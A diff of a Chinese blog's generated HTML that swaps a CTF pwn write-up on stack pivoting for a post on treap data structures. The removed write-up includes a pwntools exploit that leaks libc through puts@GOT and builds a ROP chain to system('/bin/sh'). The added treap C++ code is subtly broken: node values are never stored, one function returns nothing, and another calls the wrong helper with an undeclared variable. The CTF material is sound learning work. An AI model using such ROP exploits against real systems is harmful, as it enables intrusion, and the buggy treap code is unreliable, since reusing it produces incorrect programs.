@@ -20,28 +20,27 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"foundation","dark":"foundation"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="被冬训题stack-pivot折磨的死去活来，最后发现是bss段不够靠后  stack-pivot背景">
+    <meta name="description" content="平衡树&#x2F;&#x2F;数据结构初始化 struct node&#123;     int val,rnk,lc,rc,size;&#x2F;&#x2F;值，优先级，左右子节点，子树大小 &#125;tree[N]; int tot,root;&#x2F;&#x2F;总结点数和根节点数  &#x2F;&#x2F;节点管理 void update(int k)&#123;     tree[k].size&#x3D;tree[tree[k].lc].size+tree[tree[k">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn学习记录（其五）">
-<meta property="og:url" content="http://example.com/posts/45f7d273/">
+<meta property="og:title" content="平衡树 &amp; 文艺平衡树">
+<meta property="og:url" content="http://example.com/posts/358aa34d/">
 <meta property="og:site_name" content="qsc">
-<meta property="og:description" content="被冬训题stack-pivot折磨的死去活来，最后发现是bss段不够靠后  stack-pivot背景">
+<meta property="og:description" content="平衡树&#x2F;&#x2F;数据结构初始化 struct node&#123;     int val,rnk,lc,rc,size;&#x2F;&#x2F;值，优先级，左右子节点，子树大小 &#125;tree[N]; int tot,root;&#x2F;&#x2F;总结点数和根节点数  &#x2F;&#x2F;节点管理 void update(int k)&#123;     tree[k].size&#x3D;tree[tree[k].lc].size+tree[tree[k">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-11-17T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-11-20T13:04:47.735Z">
+<meta property="article:published_time" content="2025-02-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-03T09:06:21.135Z">
 <meta property="article:author" content="qsc">
-<meta property="article:tag" content="CTF">
-<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="算法">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="http://example.com/posts/45f7d273/">
+<link rel="canonical" href="http://example.com/posts/358aa34d/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/posts/45f7d273/","path":"posts/45f7d273/","title":"pwn学习记录（其五）"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/posts/358aa34d/","path":"posts/358aa34d/","title":"平衡树 & 文艺平衡树"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>pwn学习记录（其五） | qsc</title>
+<title>平衡树 & 文艺平衡树 | qsc</title>
   
 
 
@@ -161,7 +160,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#stack-pivot"><span class="nav-number">1.</span> <span class="nav-text">stack-pivot</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%83%8C%E6%99%AF"><span class="nav-number">1.1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.2.</span> <span class="nav-text">使用条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.3.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%BB%A5%E5%86%AC%E8%AE%AD%E9%A2%98stack-pivot%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="nav-number">1.4.</span> <span class="nav-text">实践（以冬训题stack-pivot为例）</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B9%B3%E8%A1%A1%E6%A0%91"><span class="nav-number">1.</span> <span class="nav-text">平衡树</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E8%89%BA%E5%B9%B3%E8%A1%A1%E6%A0%91"><span class="nav-number">2.</span> <span class="nav-text">文艺平衡树</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -226,7 +225,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/posts/45f7d273/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/358aa34d/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/qsc.jpg">
@@ -239,12 +238,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="pwn学习记录（其五） | qsc">
+      <meta itemprop="name" content="平衡树 &amp; 文艺平衡树 | qsc">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          pwn学习记录（其五）
+          平衡树 & 文艺平衡树
         </h1>
 
         <div class="post-meta-container">
@@ -256,14 +255,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2025-11-18 00:00:00" itemprop="dateCreated datePublished" datetime="2025-11-18T00:00:00+08:00">2025-11-18</time>
+      <time title="创建时间：2025-02-28 00:00:00" itemprop="dateCreated datePublished" datetime="2025-02-28T00:00:00+08:00">2025-02-28</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-11-20 21:04:47" itemprop="dateModified" datetime="2025-11-20T21:04:47+08:00">2025-11-20</time>
+      <time title="修改时间：2026-03-03 17:06:21" itemprop="dateModified" datetime="2026-03-03T17:06:21+08:00">2026-03-03</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -271,7 +270,7 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+          <a href="/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">算法</span></a>
         </span>
     </span>
 
@@ -289,14 +288,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>1.2k</span>
+      <span>2.4k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>2 分钟</span>
+      <span>4 分钟</span>
     </span>
 </div>
 
@@ -306,28 +305,160 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><blockquote>
-<p>被冬训题stack-pivot折磨的死去活来，最后发现是bss段不够靠后</p>
-</blockquote>
-<h1 id="stack-pivot"><a href="#stack-pivot" class="headerlink" title="stack-pivot"></a>stack-pivot</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>当栈溢出的空间较小，或者开启了PIE保护，可以考虑将指针劫持到bss段进行操作</p>
-<h2 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h2><p>可以控制程序执行流，或者可以控制栈顶指针（一般通过<code>pop rsp/esp</code>）</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>栈迁移中的关键就是对leave,ret的利用<br>相当于</p>
-<pre><code>mov rsp，rbp
-pop rbp
+    <div class="post-body" itemprop="articleBody"><h1 id="平衡树"><a href="#平衡树" class="headerlink" title="平衡树"></a>平衡树</h1><pre><code>//数据结构初始化
+struct node&#123;
+    int val,rnk,lc,rc,size;//值，优先级，左右子节点，子树大小
+&#125;tree[N];
+int tot,root;//总结点数和根节点数
+
+//节点管理
+void update(int k)&#123;
+    tree[k].size=tree[tree[k].lc].size+tree[tree[k].rc].size+1;
+    return;
+&#125;
+int add_node(int val)&#123;
+    tree[++tot].size=1;
+    tree[tot].val=0;
+    tree[tot].lc=tree[tot].rc=0;
+    tree[tot].rnk=rand();
+    return tot;
+&#125;
+
+void split(int k,int &amp;a,int &amp;b,int val)&#123;
+    if(k==0)&#123;
+        a=b=0;
+        return ;
+    &#125;
+    if(tree[k].val&lt;=val)&#123;
+        a=k;
+        split(tree[k].rc,tree[k].rc,b,val);
+    &#125;
+    else &#123;
+        b=k;
+        split(tree[k].lc,a,tree[k].lc,val);
+    &#125;
+    update(k);
+&#125;
+//给定一棵平衡树 ，按照某个权值val，分裂成平衡树a和b，且a树所有点的权值不超过val，b树的所有点权大于val。
+
+void merge(int &amp;k ,int a,int b)&#123;
+    if(a==0||b==0)&#123;
+        k=a+b;
+        return;
+    &#125;
+    if(tree[a].rnk&lt;tree[b].rnk)&#123;
+        k=a;
+        merge(tree[a].rc,tree[a].rc,b);
+    &#125;
+    else &#123;
+        k=b;
+        merge(tree[b].lc,a,tree[b].lc);
+    &#125;
+    update(k);
+&#125;
+
+void insert(int &amp;k ,int val)&#123;
+    int a=0,b=0,cur=add_node(val);
+    split(k,a,b,val);
+    merge(a,a,cur);
+    merge(k,a,b);
+    return;
+&#125;
+void del(int &amp;k,int val)&#123;
+    int a=0,b=0,z=0;
+    split(k,a,b,val);
+    split(a,a,z,val-1);
+    merge(z,tree[z].lc,tree[z].rc);
+    merge(a,a,z);
+    merge(k,a,b);
+    return;
+&#125;
+
+int find_num(int k,int x)&#123;
+    while(tree[tree[k].lc]+1!=x)&#123;
+        if(tree[tree[k].lc].size&gt;=x)&#123;
+            k=tree[k].lc;
+        &#125;
+        else &#123;
+            x-=tree[tree[k].lc].size;
+            k=tree[k].rc;
+        &#125;
+    &#125;
+    return tree[k].val;
+&#125;
+//找到树上第x小的数
+
+int find_rank(int &amp;k,int val)&#123;
+    int a=0,b=0;
+    split(k,a,b,val-1);
+    int temp=tree[a].size+1;
+    merge(k,a,b);
+    return;
+&#125;
+//查询val的排名
+
+int prev(int &amp;k,int val)&#123;
+    int a=0,b=0;
+    split(k,a,b,val-1);
+    int temp=find_num(a,tree[a].size);
+    merge(k,a,b);
+    return temp;
+&#125;
+//查询比val小的最大值
+
+int suf(int &amp;k,int val)&#123;
+    int a=0,b=0;
+    split(k,a,b,val);
+    int temp=find_num(b,1);
+    merge(k,a,b);
+    return temp;
+&#125;
 </code></pre>
-<p>连续两次的leave，ret可以将指针劫持到想要的地方<br>如果构造ROP链</p>
-<pre><code>fake_stack
-addr to leave_ret
-fake rbp
-addr to next gadget
+<h1 id="文艺平衡树"><a href="#文艺平衡树" class="headerlink" title="文艺平衡树"></a>文艺平衡树</h1><p>支持区间操作的平衡树。如区间反转，区间求和&#x2F;最值，区间赋值</p>
+<pre><code>//初始化
+struct node&#123;
+    int size,lc,rc,rnk,val;
+    bool rev;
+&#125;tree[N];
+
+void pushdown(int k)&#123;
+    if(tree[k].rev)&#123;
+        swap(tree[k].lc,tree[k].rc);
+        tree[tree[k].lc].rev^=1;
+        tree[tree[k].rc].rev^=1;
+        tree[k].rev=0;
+    &#125;
+    return ;
+&#125;
+//lazy tag方式延迟执行
+
+void split_sz(int k,int &amp;a,int &amp;b,int sz)&#123;
+    if(k==0)&#123;
+        a=b=0;
+        return;
+    &#125;
+    pushdown(k);
+    if(tree[tree[k].lc].size+1&lt;=sz)&#123;
+        a=k;
+        split(tree[k].rc,tree[k].rc,b,sz-tree[tree[k].rc].size-1);
+    &#125;
+    else &#123;
+        n=k;
+        split(tree[k].lc,a,tree[k].lc,sz);
+    &#125;
+&#125;
+//分出树的前sz个节点
+
+void reverse(int l,int r)&#123;
+    int a=0,b=0,c=0;
+    split(root,a,b,l-1);
+    split(b,b,c,r-l+1);
+    tree[b].rev^=1;
+    merge(a,a,b);
+    merge(root,a,c);
+&#125;
+//将l到r的区间反转
 </code></pre>
-<p>就可以劫持栈指针，一般劫持到bss段后的位置：<strong>注意要离bss段远一点！！！</strong></p>
-<h2 id="实践（以冬训题stack-pivot为例）"><a href="#实践（以冬训题stack-pivot为例）" class="headerlink" title="实践（以冬训题stack-pivot为例）"></a>实践（以冬训题stack-pivot为例）</h2><p>  bss5&#x3D;0x601200+0x500<br>  payload&#x3D;pwn.flat([b’a’*0x30,p64(bss5),p64(read)])<br>  sh.sendafter(“overflow?\n”,payload)<br>  payload&#x3D;pwn.flat([b’a’*0x30,p64(bss5+0x30),p64(read)])<br>  sh.send(payload)<br>首先通过两次pop|ret，将指针劫持到bss段上</p>
-<p>  puts_got&#x3D;elf.got[‘puts’]<br>  puts_plt&#x3D;elf.plt[‘puts’]<br>  payload&#x3D; pwn.flat([p64(bss5+0x40),p64(pop_rdi),p64(puts_got),p64(puts_plt),p64(main)])<br>  sh.send(payload)<br>  libc.address &#x3D; u64(sh.recv(6).ljust(8,b’\x00’))-0x80e50<br>  binsh &#x3D; next(libc.search(b’&#x2F;bin&#x2F;sh’))<br>  system &#x3D; libc.sym[‘system’]<br>  exit_addr &#x3D; libc.sym[‘exit’]<br>再在bss段上泄露libc基址</p>
-<p>  bss6&#x3D;0x601200+0x600<br>  payload &#x3D; pwn.flat([b’a’*0x30,p64(bss6+0x100), p64(read)])<br>  sh.sendafter(b’overflow?\n’, payload)<br>  payload&#x3D;pwn.flat([b’a’*0x30,p64(bss6+0x130),p64(read)])<br>  sh.send(payload)<br>  rop_chain &#x3D;pwn.flat([p64(ret),p64(pop_rdi),p64(binsh),p64(ret),p64(system)])<br>  sh.send(rop_chain)<br>再次迁移，执行system</p>
-<ul>
-<li>注意尽量往bss后段迁移，太近可能导致失败</li>
-</ul>
 
     </div>
 
@@ -366,21 +497,17 @@ addr to next gadget
 
 
           <div class="post-tags">
-              <a href="/tags/CTF/" rel="tag"># CTF</a>
-              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/%E7%AE%97%E6%B3%95/" rel="tag"># 算法</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/posts/2a691734/" rel="prev" title="pwn学习记录（其四）">
-                  <i class="fa fa-angle-left"></i> pwn学习记录（其四）
-                </a>
             </div>
             <div class="post-nav-item">
-                <a href="/posts/20f999aa/" rel="next" title="pwn学习记录（其六）">
-                  pwn学习记录（其六） <i class="fa fa-angle-right"></i>
+                <a href="/posts/afcb054a/" rel="next" title="深入理解计算机网络阅读记录（其一）">
+                  深入理解计算机网络阅读记录（其一） <i class="fa fa-angle-right"></i>
                 </a>
             </div>
           </div>
